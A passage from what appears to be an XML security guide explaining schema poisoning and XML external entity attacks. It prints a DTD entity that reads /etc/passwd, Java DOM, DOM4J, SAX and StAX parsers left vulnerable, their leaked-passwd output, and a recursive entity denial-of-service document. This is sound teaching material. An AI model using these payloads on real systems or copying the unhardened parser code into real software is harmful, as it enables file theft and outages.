<span class="w"> </span><span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
<span class="w"> </span><span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
<span class="w"> </span><span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
<span class="w"> </span><span class="nt">&lt;body&gt;</span>Don&#39;t<span class="w"> </span>forget<span class="w"> </span>me<span class="w"> </span>this<span class="w"> </span>weekend<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/note&gt;</span>
</code></pre></div>
<p>All restrictions on the note element could be removed or altered, allowing the sending of any type of data to the server. Furthermore, if the server is processing external entities, the attacker could use the schema, for example, to read remote files from the server. <strong>This type of schema only serves as a suggestion for sending a document, but it must contain a way to check the embedded schema integrity to be used safely. Attacks through embedded schemas are commonly used to exploit external entity expansions. Embedded XML schemas can also assist in port scans of internal hosts or brute force attacks.</strong></p>
<h5 id="incorrect-permissions">Incorrect Permissions<a class="headerlink" href="#incorrect-permissions" title="Permanent link">&para;</a></h5>
<p><strong>You can often circumvent the risk of using remotely tampered versions by processing a local schema.</strong></p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span>
<span class="nt">&lt;note&gt;</span>
<span class="w"> </span><span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
<span class="w"> </span><span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
<span class="w"> </span><span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
<span class="w"> </span><span class="nt">&lt;body&gt;</span>Don&#39;t<span class="w"> </span>forget<span class="w"> </span>me<span class="w"> </span>this<span class="w"> </span>weekend<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/note&gt;</span>
</code></pre></div>
<p><strong>However, if the local schema does not contain the correct permissions, an internal attacker could alter the original restrictions.</strong> The following line exemplifies a schema using permissions that allow any user to make modifications:</p>
<div class="highlight"><pre><span></span><code>-rw-rw-rw-  1 user  staff  743 Jan 15 12:32 note.dtd
</code></pre></div>
<p>The permissions set on <code>name.dtd</code> allow any user on the system to make modifications. This vulnerability is clearly not related to the structure of an XML or a schema, but since these documents are commonly stored in the filesystem, it is worth mentioning that an attacker could exploit this type of problem.</p>
<h4 id="remote-schema-poisoning">Remote Schema Poisoning<a class="headerlink" href="#remote-schema-poisoning" title="Permanent link">&para;</a></h4>
<p><strong>Schemas defined by external organizations are normally referenced remotely. If capable of diverting or accessing the network's traffic, an attacker could cause a victim to fetch a distinct type of content rather than the one originally intended.</strong></p>
<h5 id="man-in-the-middle-mitm-attack">Man-in-the-Middle (MitM) Attack<a class="headerlink" href="#man-in-the-middle-mitm-attack" title="Permanent link">&para;</a></h5>
<p>When documents reference remote schemas using the unencrypted Hypertext Transfer Protocol (HTTP), the communication is performed in plain text and an attacker could easily tamper with traffic. <strong>When XML documents reference remote schemas using an HTTP connection, the connection could be sniffed and modified before reaching the end user:</strong></p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE note SYSTEM &quot;http://example.com/note.dtd&quot;&gt;</span>
<span class="nt">&lt;note&gt;</span>
<span class="w"> </span><span class="nt">&lt;to&gt;</span>Tove<span class="nt">&lt;/to&gt;</span>
<span class="w"> </span><span class="nt">&lt;from&gt;</span>Jani<span class="nt">&lt;/from&gt;</span>
<span class="w"> </span><span class="nt">&lt;heading&gt;</span>Reminder<span class="nt">&lt;/heading&gt;</span>
<span class="w"> </span><span class="nt">&lt;body&gt;</span>Don&#39;t<span class="w"> </span>forget<span class="w"> </span>me<span class="w"> </span>this<span class="w"> </span>weekend<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/note&gt;</span>
</code></pre></div>
<p>The remote file <code>note.dtd</code> could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .</p>
<h5 id="dns-cache-poisoning">DNS-Cache Poisoning<a class="headerlink" href="#dns-cache-poisoning" title="Permanent link">&para;</a></h5>
<p>Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). <strong>When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname.</strong> In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.</p>
<p>The previous example referenced the host <code>example.com</code> using an unencrypted protocol.</p>
<p>When switching to HTTPS, the location of the remote schema will look like <code>https://example/note.dtd</code>. In a normal scenario, the IP of <code>example.com</code> resolves to <code>1.1.1.1</code>:</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>host<span class="w"> </span>example.com
example.com<span class="w"> </span>has<span class="w"> </span>address<span class="w"> </span><span class="m">1</span>.1.1.1
</code></pre></div>
<p>If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker <code>2.2.2.2</code>:</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>host<span class="w"> </span>example.com
example.com<span class="w"> </span>has<span class="w"> </span>address<span class="w"> </span><span class="m">2</span>.2.2.2
</code></pre></div>
<p>When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.</p>
<h5 id="evil-employee-attack">Evil Employee Attack<a class="headerlink" href="#evil-employee-attack" title="Permanent link">&para;</a></h5>
<p>When third parties host and define schemas, the contents are not under the control of the schemas' users. <strong>Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>).</strong></p>
<h3 id="xml-entity-expansion">XML Entity Expansion<a class="headerlink" href="#xml-entity-expansion" title="Permanent link">&para;</a></h3>
<p>**If the parser uses a <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a>, an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.</p>
<h4 id="sample-vulnerable-java-implementations">Sample Vulnerable Java Implementations<a class="headerlink" href="#sample-vulnerable-java-implementations" title="Permanent link">&para;</a></h4>
<p><strong>Using the <a href="https://www.w3schools.com/xml/xml_dtd_intro.asp">DTD</a> capabilities of referencing local or remote files it is possible to affect file confidentiality.</strong> In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.</p>
<p><strong>Sample XML</strong>:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE contacts SYSTEM &quot;contacts.dtd&quot;&gt;</span>
<span class="nt">&lt;contacts&gt;</span>
<span class="w"> </span><span class="nt">&lt;contact&gt;</span>
<span class="w">  </span><span class="nt">&lt;firstname&gt;</span>John<span class="nt">&lt;/firstname&gt;</span>
<span class="w">  </span><span class="nt">&lt;lastname&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/lastname&gt;</span>
<span class="w"> </span><span class="nt">&lt;/contact&gt;</span>
<span class="nt">&lt;/contacts&gt;</span>
</code></pre></div>
<p><strong>Sample DTD</strong>:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!ELEMENT contacts (contact*)&gt;</span>
<span class="cp">&lt;!ELEMENT contact (firstname,lastname)&gt;</span>
<span class="cp">&lt;!ELEMENT firstname (#PCDATA)&gt;</span>
<span class="cp">&lt;!ELEMENT lastname ANY&gt;</span>
<span class="cp">&lt;!ENTITY xxe SYSTEM &quot;/etc/passwd&quot;&gt;</span>
</code></pre></div>
<h5 id="xxe-using-dom">XXE using DOM<a class="headerlink" href="#xxe-using-dom" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilder</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.DocumentBuilderFactory</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.ParserConfigurationException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.InputSource</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Document</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Element</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.Node</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.w3c.dom.NodeList</span><span class="p">;</span>

<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="p">{</span>
<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">   </span><span class="n">DocumentBuilderFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DocumentBuilderFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
<span class="w">   </span><span class="n">DocumentBuilder</span><span class="w"> </span><span class="n">builder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newDocumentBuilder</span><span class="p">();</span>
<span class="w">   </span><span class="n">Document</span><span class="w"> </span><span class="n">doc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">builder</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InputSource</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">));</span>
<span class="w">   </span><span class="n">NodeList</span><span class="w"> </span><span class="n">nodeList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">doc</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;contact&quot;</span><span class="p">);</span>
<span class="w">   </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">nodeList</span><span class="p">.</span><span class="na">getLength</span><span class="p">();</span><span class="w"> </span><span class="n">s</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">     </span><span class="n">Node</span><span class="w"> </span><span class="n">firstNode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nodeList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
<span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">firstNode</span><span class="p">.</span><span class="na">getNodeType</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Node</span><span class="p">.</span><span class="na">ELEMENT_NODE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">firstElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">firstNode</span><span class="p">;</span>
<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">firstNameElementList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;firstname&quot;</span><span class="p">);</span>
<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">firstNameElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">firstNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">firstName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span>
<span class="w">       </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;First Name: &quot;</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">Node</span><span class="p">)</span><span class="w"> </span><span class="n">firstName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span>
<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">lastNameElementList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;lastname&quot;</span><span class="p">);</span>
<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">lastNameElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">lastNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">lastName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lastNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span>
<span class="w">       </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Last Name: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">Node</span><span class="p">)</span><span class="w"> </span><span class="n">lastName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span>
<span class="w">     </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w"> </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>The previous code produces the following output:</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>javac<span class="w"> </span>parseDocument.java<span class="w"> </span><span class="p">;</span><span class="w"> </span>java<span class="w"> </span>parseDocument
First<span class="w"> </span>Name:<span class="w"> </span>John
Last<span class="w"> </span>Name:<span class="w"> </span><span class="c1">### User Database</span>
...
nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
</code></pre></div>
<h5 id="xxe-using-dom4j">XXE using DOM4J<a class="headerlink" href="#xxe-using-dom4j" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.Document</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.DocumentException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.SAXReader</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.OutputFormat</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.XMLWriter</span><span class="p">;</span>

<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test1</span><span class="w"> </span><span class="p">{</span>
<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">Document</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">   </span><span class="n">SAXReader</span><span class="w"> </span><span class="n">reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SAXReader</span><span class="p">();</span>
<span class="w">   </span><span class="n">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reader</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">OutputFormat</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OutputFormat</span><span class="p">.</span><span class="na">createPrettyPrint</span><span class="p">();</span>
<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">   </span><span class="n">XMLWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLWriter</span><span class="p">(</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">,</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="p">);</span>
<span class="w">   </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w"> </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>The previous code produces the following output:</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>java<span class="w"> </span>test1
&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>?&gt;
&lt;!DOCTYPE<span class="w"> </span>contacts<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;contacts.dtd&quot;</span>&gt;

&lt;contacts&gt;
<span class="w"> </span>&lt;contact&gt;
<span class="w">  </span>&lt;firstname&gt;John&lt;/firstname&gt;
<span class="w">  </span>&lt;lastname&gt;###<span class="w"> </span>User<span class="w"> </span>Database
...
nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
</code></pre></div>
<h5 id="xxe-using-sax">XXE using SAX<a class="headerlink" href="#xxe-using-sax" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParser</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.SAXException</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="p">;</span>

<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">DefaultHandler</span><span class="w"> </span><span class="p">{</span>
<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">new</span><span class="w"> </span><span class="n">parseDocument</span><span class="p">();</span>
<span class="w"> </span><span class="p">}</span>
<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="nf">parseDocument</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">   </span><span class="n">SAXParserFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SAXParserFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
<span class="w">   </span><span class="n">SAXParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newSAXParser</span><span class="p">();</span>
<span class="w">   </span><span class="n">parser</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w"> </span><span class="p">}</span>
<span class="w"> </span><span class="nd">@Override</span>
<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">characters</span><span class="p">(</span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">ac</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SAXException</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">tmpValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">ac</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">);</span>
<span class="w">  </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">tmpValue</span><span class="p">);</span>
<span class="w"> </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>The previous code produces the following output:</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>java<span class="w"> </span>parseDocument
John
<span class="c1">#### User Database</span>
...
nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
</code></pre></div>
<h5 id="xxe-using-stax">XXE using StAX<a class="headerlink" href="#xxe-using-stax" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.stream.XMLStreamReader</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.stream.XMLInputFactory</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileReader</span><span class="p">;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span>

<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="p">{</span>
<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">   </span><span class="n">XMLInputFactory</span><span class="w"> </span><span class="n">xmlif</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
<span class="w">   </span><span class="n">FileReader</span><span class="w"> </span><span class="n">fr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
<span class="w">   </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
<span class="w">   </span><span class="n">XMLStreamReader</span><span class="w"> </span><span class="n">xmlfer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlif</span><span class="p">.</span><span class="na">createXMLStreamReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span>
<span class="w">                                            </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">file</span><span class="p">));</span>
<span class="w">   </span><span class="kt">int</span><span class="w"> </span><span class="n">eventType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlfer</span><span class="p">.</span><span class="na">getEventType</span><span class="p">();</span>
<span class="w">   </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">eventType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlfer</span><span class="p">.</span><span class="na">next</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasText</span><span class="p">()){</span>
<span class="w">     </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">print</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">getText</span><span class="p">());</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">   </span><span class="p">}</span>
<span class="w">   </span><span class="n">fr</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
<span class="w">  </span><span class="p">}</span>
<span class="w"> </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>The previous code produces the following output:</p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>java<span class="w"> </span>parseDocument
&lt;!DOCTYPE<span class="w"> </span>contacts<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;contacts.dtd&quot;</span>&gt;John###<span class="w"> </span>User<span class="w"> </span>Database
...
nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
</code></pre></div>
<h4 id="recursive-entity-reference">Recursive Entity Reference<a class="headerlink" href="#recursive-entity-reference" title="Permanent link">&para;</a></h4>
<p><strong>When the definition of an element <code>A</code> is another element <code>B</code>, and that element <code>B</code> is defined as element <code>A</code>, that schema describes a circular reference between elements:</strong></p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE A [</span>
<span class="cp"> &lt;!ELEMENT A ANY&gt;</span>
<span class="w"> </span><span class="cp">&lt;!ENTITY A &quot;&lt;A&gt;</span><span class="ni">&amp;B;</span><span class="nt">&lt;/A&gt;</span>&quot;&gt;
<span class="w"> </span><span class="cp">&lt;!ENTITY B &quot;&amp;A;&quot;&gt;</span>
]&gt;
<span class="nt">&lt;A&gt;</span><span class="ni">&amp;A;</span><span class="nt">&lt;/A&gt;</span>
</code></pre></div>
<h4 id="quadratic-blowup">Quadratic Blowup<a class="headerlink" href="#quadratic-blowup" title="Permanent link">&para;</a></h4>
<p><strong>Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (<em>O(n^2)</em>).</strong></p>
<p>The result of the following attack will be 100,000 x 100,000 characters in memory.</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
